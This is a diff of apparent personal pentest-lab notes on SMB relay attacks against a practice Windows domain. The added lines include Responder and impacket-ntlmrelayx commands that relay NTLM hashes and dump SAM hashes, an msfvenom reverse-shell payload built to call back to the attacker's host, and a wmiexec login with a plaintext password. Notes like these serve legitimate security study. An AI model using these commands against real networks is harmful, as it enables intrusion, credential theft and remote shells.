@@ -5,7 +5,9 @@
 <title>SMB Relay</title>
 </head><body><img src="image.png" /><br/>
 <br/>
-<img src="image 2.png" /><br/>
+<br/>
+<br/>
+SMB signing must be off<br/>
 <br/>
 we are only going to be listening and not responding, but relaying that info <br/>
 <br/>
@@ -27,9 +29,20 @@ relay the credentials form facstle(192.168.57.17) to pparker(192.168.57.18)<br/>
 <br/>
 <img src="image 5.png" /><br/>
 <br/>
+<br/>
 -tf:target file<br/>
 <br/>
 also run responder alongside it<br/>
+<br/>
+OR &nbsp; <br/>
+<br/>
+<img src="image 19.png" /><br/>
+<br/>
+-t:target<br/>
+<br/>
+we also get local users SAM hash<br/>
+<br/>
+<img src="image 20.png" /><br/>
 <br/>
 <img src="image 6.png" /><br/>
 <br/>
@@ -59,6 +72,10 @@ connect to that via netcat<br/>
 <img src="image 12.png" /><br/>
 <br/>
 this is SMB shell<br/>
+<br/>
+or <br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.18(spiderman in this case) -smb2support <br/>
 <br/>
 <img src="image 13.png" /><br/>
 <br/>
@@ -95,4 +112,26 @@ other options which may work sometimes<br/>
 <br/>
 #wmiexec.py marvel.local/fcastle:P@ssword@192.168.57.17<br/>
 <br/>
-</body></html>
+--------------------------------------------------------------------------------------------------------------<br/>
+Another way to get shell is <br/>
+<br/>
+#msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.57.5 LPORT=4444 -f exe -o shell.exe<br/>
+-p:payload<br/>
+-f:output file type<br/>
+-o:output file name<br/>
+<br/>
+<img src="image 2.png" /><br/>
+<br/>
+<br/>
+#responder -I eth0 -dwv<br/>
+<br/>
+#impacket-ntlmrelayx -t 192.168.57.18(spiderman in this case) -smb2support -e shell.exe<br/>
+<img src="image 21.png" /><br/>
+<br/>
+<br/>
+-e:executable file<br/>
+relaying ntlm hashes to spiderman<br/>
+<br/>
+<img src="image 22.png" /><br/>
+<br/>
+<img src="image 23.png" /></body></html>
